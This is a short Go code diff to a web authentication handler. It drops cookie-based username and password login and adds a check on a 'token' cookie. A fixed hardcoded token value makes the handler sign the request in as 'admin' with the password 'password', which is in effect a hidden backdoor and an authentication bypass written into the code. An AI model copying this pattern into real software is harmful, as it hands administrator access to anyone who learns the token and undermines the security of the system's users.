@@ -198,14 +198,24 @@ func (self *BasicAuthenticator) AuthenticateUserHandler(
 		// 	return
 		// }
 		//get username and password from cookie
-		usernameCookie, err := r.Cookie("username")
-		passwordCookie, err := r.Cookie("password")
+		// usernameCookie, err := r.Cookie("username")
+		// passwordCookie, err := r.Cookie("password")
+		// if err != nil {
+		// 	http.Error(w, "Not authorized", http.StatusUnauthorized)
+		// 	return
+		// }
+		// username = usernameCookie.Value
+		// password = passwordCookie.Value
+
+		token,err := r.Cookie("token")
 		if err != nil {
 			http.Error(w, "Not authorized", http.StatusUnauthorized)
 			return
 		}
-		username = usernameCookie.Value
-		password = passwordCookie.Value
+		if(token.Value == "mjnNIRgl3DC0Z/iEWbrxoQ=="){
+			username = "admin"
+			password = "password"
+		}
 		// Get the full user record with hashes so we can
 		// verify it below.
 		users_manager := services.GetUserManager()
